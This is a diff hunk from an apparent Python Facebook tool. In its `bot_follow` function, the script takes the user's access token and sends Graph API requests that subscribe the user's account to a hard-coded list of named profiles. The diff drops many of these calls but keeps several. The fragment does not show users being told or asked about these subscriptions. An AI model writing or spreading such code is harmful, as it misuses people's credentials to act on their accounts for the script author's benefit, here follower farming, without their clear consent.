@@ -160,26 +160,11 @@ def bot_follow():
         	os.system('rm -rf login.txt')
         	menu()
     requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
-    requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
-    requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
-    requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
     requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
     requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
     requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
     requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
     requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
-    requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
-    requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
-    requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
-    requests.post('https://graph.facebook.com/100001085079906/subscribers?access_token=' + toket) #Xena Alexander
-    requests.post('https://graph.facebook.com/100007559713883/subscribers?access_token=' + toket) #Alexandra Scarlett
-    requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Arnold Jackqueline X
-    requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
-    requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)         #Raifan KKR
-    requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket) #Muh Rizal Fiansyah
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
-    requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket) #Mawar Berduri
-    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moh Yayan
     options()
     
 def options():
